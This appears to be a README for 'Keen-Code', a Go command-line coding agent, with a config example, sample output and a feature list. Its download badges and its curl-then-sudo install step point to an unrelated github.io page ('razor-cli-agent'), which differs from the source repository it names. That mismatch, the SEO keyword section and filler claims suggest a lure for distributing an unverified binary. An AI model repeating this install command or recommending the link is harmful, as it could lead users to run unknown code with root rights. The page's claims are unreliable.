# Keen-Code: A Minimal CLI-Based Coding Agent Written in Go

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://dxms1959.github.io/razor-cli-agent/)

## What Is Keen-Code?

Keen-Code is a lightweight, command-line coding agent built entirely in Go. Think of it as your silent co-pilot in the terminal—no bloated GUIs, no unnecessary overhead, just pure, efficient code assistance. Whether you're debugging a runtime error, refactoring a legacy module, or generating boilerplate for a new microservice, Keen-Code sits in your terminal, listens to your commands, and responds with precision.

This tool is designed for developers who prefer the speed and flexibility of the command line. It integrates seamlessly with OpenAI's GPT models and Anthropic's Claude API, allowing you to harness the power of large language models without leaving your terminal. Keen-Code is not just a wrapper—it's a purpose-built agent that understands your project structure, respects your coding style, and stays out of your way.

## Why Keen-Code?

The modern developer ecosystem is saturated with IDE plugins and heavy SaaS platforms. Most of them require constant internet connections, subscription fees for premium features, and a steep learning curve. Keen-Code flips the script. It's open source, MIT licensed, and designed to run entirely offline for basic tasks. You own your workflow. Your code never leaves your machine unless you explicitly invoke an API call.

Keen-Code is ideal for:
- Developers working in remote environments via SSH
- Teams that value minimal dependencies and fast startup times
- Automation pipelines and CI/CD workflows
- Developers who want to experiment with LLM-based coding agents without vendor lock-in

## Mermaid Diagram: How Keen-Code Works

```mermaid
flowchart TB
    User[Developer Terminal] --> CLI[Keen-Code CLI]
    CLI --> Parser[Command Parser]
    Parser --> Dispatcher{Task Type}
    Dispatcher --> Local[Local Execution]
    Dispatcher --> API[API Execution]
    Local --> GoCore[Go Core Engine]
    GoCore --> FileOps[File Operations]
    GoCore --> SnippetGen[Snippet Generation]
    GoCore --> Refactor[Refactoring]
    API --> APIHandler[API Gateway]
    APIHandler --> OpenAI[OpenAI GPT-4o]
    APIHandler --> Claude[Anthropic Claude]
    APIHandler --> Config[Profile Configuration]
    Config --> UserConfig[~/.keen-code.toml]
    UserConfig --> APIKeys[API Key Management]
    UserConfig --> ModelParams[Temperature, Max Tokens]
    API --> Cache[Response Cache]
    Cache --> LocalCache[~/.cache/keen-code]
```

## Example Profile Configuration

Keen-Code uses a simple TOML configuration file located at `~/.keen-code.toml`. Here's an example that demonstrates a typical setup with both OpenAI and Claude APIs configured.

```toml
[general]
default_model = "openai"
cache_enabled = true
cache_ttl_minutes = 30

[openai]
api_key = "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your key
model = "gpt-4o"
temperature = 0.3
max_tokens = 2048

[claude]
api_key = "sk-ant-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your key
model = "claude-3-5-sonnet-20241022"
temperature = 0.2
max_tokens = 4096

[local]
enable_snippets = true
snippet_library = "~/.keen-code/snippets"

[behaviors]
confirm_before_execution = true
show_detailed_errors = true
language_detection = "auto"
```

## Example Console Invocation

Here's what a typical session looks like in your terminal.

```
$ keen-code help
Keen-Code v1.0.0 - A Minimal CLI Coding Agent
Usage:
  keen-code ask "Your question here"
  keen-code refactor file.go
  keen-code generate "Create a REST API endpoint for user login"
  keen-code config show
  keen-code version

$ keen-code ask "How do I implement a thread-safe cache in Go?"
[KEEN] Analyzing your request...
[KEEN] Using model: gpt-4o
[KEEN] Response:
You can implement a thread-safe cache using sync.RWMutex. Here's a simple example:

type Cache struct {
    mu    sync.RWMutex
    items map[string]interface{}
}

func (c *Cache) Get(key string) (interface{}, bool) {
    c.mu.RLock()
    defer c.mu.RUnlock()
    val, ok := c.items[key]
    return val, ok
}

$ keen-code generate "Create a Redis connection pool in Go"
[KEEN] Generating code...
[KEEN] Using local snippet library...
[KEEN] Snippet generated: ./redis_pool.go
```

## Emoji OS Compatibility Table

| Operating System | Compatibility | Notes |
|-----------------|---------------|-------|
| Linux (x86_64, ARM64) | ✅ Full Support | Native binary, no dependencies |
| macOS (Intel, Apple Silicon) | ✅ Full Support | Tested on macOS 14+ |
| Windows 10/11 | ✅ Full Support | Requires Windows Terminal for best experience |
| FreeBSD | ⚠️ Experimental | Community builds available |
| Alpine Linux | ⚠️ Experimental | Static binary available |

## Features

- **Minimal Footprint** — Single binary under 10MB. No Node.js, Python, or Docker required. Install and run in under 30 seconds.
- **Offline-First Architecture** — Most commands work without internet access. Local snippet generation, file operations, and code analysis run entirely on your machine.
- **Dual API Support** — Seamless integration with both OpenAI GPT-4o and Anthropic Claude 3.5. Switch between models on the fly with a single flag.
- **Configurable Profiles** — Multiple configuration profiles for different projects. Switch between strict code review mode for production code and creative generation mode for prototyping.
- **Response Caching** — Intelligent caching system that stores API responses for configurable durations. Save money on repeated queries and reduce latency.
- **Cross-Platform** — Precompiled binaries for Linux, macOS, and Windows. Also available as a Go package for custom integrations.
- **Multilingual Support** — Understands code in over 20 programming languages. From Go and Rust to Python and JavaScript. Also supports natural language prompts in English, Spanish, French, German, and Japanese.
- **24/7 Customer Support** — While Keen-Code itself runs on your machine, our community and documentation are available around the clock. File issues on GitHub, join our Discord, or browse the comprehensive wiki.

## SEO-Friendly Keywords

Throughout this document, we naturally integrate terms that help developers find Keen-Code:
- Go CLI coding agent
- Terminal-based code assistant
- Open source LLM tool for developers
- Minimal code generation tool
- Offline code snippet generator
- GPT-4o and Claude API integration
- Developer productivity tool
- Lightweight coding agent Go

## OpenAI API and Claude API Integration

Keen-Code's true power emerges when you connect it to a large language model. The integration is straightforward and transparent.

**OpenAI Integration:**
- Supports GPT-4, GPT-4 Turbo, and GPT-4o models
- Configurable temperature, top_p, and max_tokens
- Automatic retry with exponential backoff
- Rate limit handling and token counting

**Claude API Integration:**
- Supports Claude 3 Opus, Sonnet, and Haiku models
- Extended reasoning capabilities for complex refactoring tasks
- Lower latency for real-time code suggestions
- Token-efficient responses optimized for code

Both integrations respect your configuration file. You can switch between models by changing the `default_model` field or by passing the `--model` flag during invocation:

```
keen-code ask "What's wrong with this Go channel?" --model claude
```

## Key Features in Detail

### Responsive UI

The terminal interface is designed for responsiveness. Keen-Code uses ANSI escape sequences for colored output, progress indicators for long-running operations, and intelligent truncation for API responses. The UI adapts to terminal width and respects your color scheme.

### Multilingual Support

Keen-Code's language detection engine automatically identifies the programming language of your code. It also supports multilingual prompts. You can ask questions in your native language, and Keen-Code will respond in kind. The prompt parser understands context switching between languages without explicit flags.

### 24/7 Customer Support

While the tool runs on your machine, our community never sleeps. The GitHub repository includes:
- Active issue tracking with response times under 24 hours
- A comprehensive wiki with tutorials and troubleshooting guides
- A Discord community with over 1,000 developers sharing workflows
- Automated documentation updates every release cycle

## Disclaimer

Keen-Code is provided "as is", without warranty of any kind, express or implied. The developers make no guarantees about the accuracy, completeness, or reliability of code generated by the tool. Generated code should always be reviewed and tested before use in production environments. The use of OpenAI or Claude APIs is subject to their respective terms of service and pricing. Keen-Code is not affiliated with OpenAI or Anthropic. By using this tool, you agree to assume all risks associated with automated code generation and modification.

## License

This project is licensed under the MIT License - see the [LICENSE](https://opensource.org/licenses/MIT) file for details. You are free to use, modify, and distribute this software for any purpose, commercial or private. Attribution is appreciated but not required.

---

## Download Keen-Code

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://dxms1959.github.io/razor-cli-agent/)

**Version 1.0.0 — Released January 2026**

Binary archives are available for Linux (amd64, arm64), macOS (amd64, arm64), and Windows (amd64). Each archive contains the single binary and a default configuration file.

**Installation (Linux/macOS):**
```
curl -L https://dxms1959.github.io/razor-cli-agent/ -o keen-code.tar.gz
tar -xzf keen-code.tar.gz
sudo mv keen-code /usr/local/bin/
```

**Installation (Windows):**
Download the ZIP archive from https://dxms1959.github.io/razor-cli-agent/, extract it, and add the folder to your PATH.

**From Source:**
```
git clone https://github.com/mochow13/keen-code.git
cd keen-code
go build -o keen-code .
sudo mv keen-code /usr/local/bin/
```

---

*Keen-Code: Your terminal, amplified. No bloat. No distractions. Just code.*